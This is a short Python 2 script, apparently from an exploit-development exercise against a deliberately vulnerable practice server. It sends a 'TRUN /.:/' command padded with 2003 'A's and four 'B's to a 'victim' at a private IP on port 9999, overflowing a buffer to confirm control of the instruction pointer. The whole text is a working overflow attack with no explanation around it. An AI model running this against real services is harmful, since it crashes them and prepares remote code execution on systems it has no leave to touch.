#!/usr/bin/python
import sys, socket

#declaring shellcode variable
shellcode = "A" * 2003 + "B" * 4

try:
		#Trying to connect to victim IP and port
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.connect(('192.168.8.162' , 9999))

		#sending a msg and As and Bs
		s.send(("TRUN /.:/" + shellcode))
		s.close()

except:
		#Connection error
		print "Error connecting to server"
		sys.exit()


